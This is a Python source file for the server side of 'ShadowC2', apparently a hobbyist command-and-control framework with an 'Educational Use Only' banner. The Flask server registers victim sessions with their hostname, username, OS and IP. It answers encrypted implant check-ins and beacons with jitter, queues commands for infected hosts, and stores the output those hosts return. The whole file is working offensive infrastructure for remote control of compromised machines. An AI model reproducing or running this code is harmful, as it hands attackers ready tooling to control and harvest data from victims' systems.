"""
ShadowC2 - C2 Server (Final Fixed Version)
"""

import os
import sys
import json
import time
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify
from colorama import init, Fore, Style

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.crypto import CryptoHandler
from common.protocol import C2Message

init(autoreset=True)

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

class C2Server:
    def __init__(self, host="0.0.0.0", port=8443, key=None):
        self.host = host
        self.port = port
        self.start_time = datetime.now()
        
        if key:
            self.master_key = key
        else:
            self.master_key = CryptoHandler.generate_key()
            print(f"{Fore.YELLOW}[!] Generated new master key: {CryptoHandler(self.master_key).get_key_base64()}")
        
        self.crypto = CryptoHandler(self.master_key)
        self.sessions = {}
        
        self.db_path = "c2_server.db"
        self.init_database()
        
        print(f"{Fore.GREEN}[+] C2 Server initialized")
        print(f"    Host: {self.host}")
        print(f"    Port: {self.port}")
    
    def init_database(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                os TEXT,
                ip_address TEXT,
                first_seen INTEGER,
                last_seen INTEGER,
                status TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                command_id TEXT PRIMARY KEY,
                session_id TEXT,
                command TEXT,
                timestamp INTEGER,
                status TEXT,
                output TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        print(f"{Fore.GREEN}[+] Database initialized")
    
    def register_session(self, session_id, system_info):
        self.sessions[session_id] = {
            "session_id": session_id,
            "hostname": system_info.get("hostname", "Unknown"),
            "username": system_info.get("username", "Unknown"),
            "os": system_info.get("os", "Unknown"),
            "ip_address": system_info.get("ip_address", "Unknown"),
            "first_seen": int(time.time()),
            "last_seen": int(time.time()),
            "status": "active"
        }
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO sessions 
            (session_id, hostname, username, os, ip_address, first_seen, last_seen, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            session_id,
            self.sessions[session_id]["hostname"],
            self.sessions[session_id]["username"],
            self.sessions[session_id]["os"],
            self.sessions[session_id]["ip_address"],
            self.sessions[session_id]["first_seen"],
            self.sessions[session_id]["last_seen"],
            "active"
        ))
        conn.commit()
        conn.close()
        
        self.log(f"New session: {session_id[:8]}... ({self.sessions[session_id]['hostname']})")
    
    def update_session(self, session_id):
        if session_id in self.sessions:
            self.sessions[session_id]["last_seen"] = int(time.time())
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute("UPDATE sessions SET last_seen = ? WHERE session_id = ?", (int(time.time()), session_id))
            conn.commit()
            conn.close()
    
    def get_pending_commands(self, session_id):
        """Get commands from database"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT command_id, command FROM commands WHERE session_id = ? AND status = 'queued'",
                (session_id,)
            )
            rows = cursor.fetchall()
            
            commands = []
            for command_id, command_json in rows:
                cmd_dict = json.loads(command_json)
                commands.append(cmd_dict)
                
                # Mark as sent
                cursor.execute(
                    "UPDATE commands SET status = 'sent' WHERE command_id = ?",
                    (command_id,)
                )
            
            conn.commit()
            conn.close()
            
            if commands:
                self.log(f"Sending {len(commands)} command(s) to {session_id[:8]}...")
            
            return commands
            
        except Exception as e:
            self.log(f"Error getting commands: {e}", "ERROR")
            return []
    
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if level == "INFO":
            color = Fore.GREEN
        elif level == "WARNING":
            color = Fore.YELLOW
        else:
            color = Fore.RED
        
        print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")

c2_server = None

@app.route('/api/v1/checkin', methods=['POST'])
def handle_checkin():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({"error": "No data"}), 400
        
        decrypted = c2_server.crypto.decrypt(encrypted_data)
        msg = C2Message.from_dict(decrypted)
        
        c2_server.register_session(msg.session_id, msg.data)
        
        response = {"status": "success", "beacon_interval": 60, "jitter": 30}
        encrypted_response = c2_server.crypto.encrypt(response)
        return jsonify({"data": encrypted_response}), 200
        
    except Exception as e:
        c2_server.log(f"Checkin error: {e}", "ERROR")
        return jsonify({"error": str(e)}), 500

@app.route('/api/v1/beacon', methods=['POST'])
def handle_beacon():
    try:
        encrypted_data = request.json.get('data')
        session_id = request.json.get('session_id')
        
        decrypted = c2_server.crypto.decrypt(encrypted_data)
        c2_server.update_session(session_id)
        
        commands = c2_server.get_pending_commands(session_id)
        response = {"status": "success", "commands": commands}
        
        encrypted_response = c2_server.crypto.encrypt(response)
        return jsonify({"data": encrypted_response}), 200
        
    except Exception as e:
        c2_server.log(f"Beacon error: {e}", "ERROR")
        return jsonify({"error": str(e)}), 500

@app.route('/api/v1/response', methods=['POST'])
def handle_response():
    try:
        encrypted_data = request.json.get('data')
        session_id = request.json.get('session_id')
        
        decrypted = c2_server.crypto.decrypt(encrypted_data)
        msg = C2Message.from_dict(decrypted)
        
        command_id = msg.data.get('command_id')
        output = msg.data.get('output', '')
        success = msg.data.get('success', False)
        
        # Update database
        conn = sqlite3.connect(c2_server.db_path)
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE commands SET status = ?, output = ? WHERE command_id = ?",
            ("completed" if success else "failed", output, command_id)
        )
        conn.commit()
        conn.close()
        
        c2_server.log(f"Response from {session_id[:8]}...")
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"[OUTPUT from {session_id[:8]}...]")
        print(f"{'='*80}")
        print(output)
        print(f"{'='*80}{Style.RESET_ALL}\n")
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        c2_server.log(f"Response error: {e}", "ERROR")
        return jsonify({"error": str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    uptime = (datetime.now() - c2_server.start_time).total_seconds()
    return jsonify({
        "status": "operational",
        "uptime_seconds": int(uptime),
        "active_sessions": len(c2_server.sessions)
    }), 200

def print_banner():
    print(f"""
{Fore.RED}   _____ __              __              __________ 
  / ___// /_  ____ _____/ /___ _      __/ ____/__ \\
  \__ \/ __ \/ __ `/ __  / __ \ | /| / / /     __/ /
 ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / /___  / __/ 
/____/_/ /_/\__,_/\__,_/\____/|__/|__/\____/ /____/ 
                                                     
{Fore.CYAN}        Command & Control Framework v1.0
{Fore.YELLOW}        Educational Use Only - @Akshat
{Style.RESET_ALL}""")

def main():
    global c2_server
    import argparse
    
    parser = argparse.ArgumentParser(description='ShadowC2 Server')
    parser.add_argument('--host', default='0.0.0.0')
    parser.add_argument('--port', type=int, default=8443)
    parser.add_argument('--key', help='Master key (base64)')
    
    args = parser.parse_args()
    
    print_banner()
    
    master_key = None
    if args.key:
        master_key = CryptoHandler.key_from_base64(args.key)
    
    c2_server = C2Server(host=args.host, port=args.port, key=master_key)
    
    print(f"\n{Fore.GREEN}[+] Starting C2 server on {args.host}:{args.port}")
    print(f"{Fore.YELLOW}[!] Press Ctrl+C to stop\n")
    
    try:
        app.run(host=args.host, port=args.port, ssl_context='adhoc')
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Server stopped")

if __name__ == "__main__":
    main()
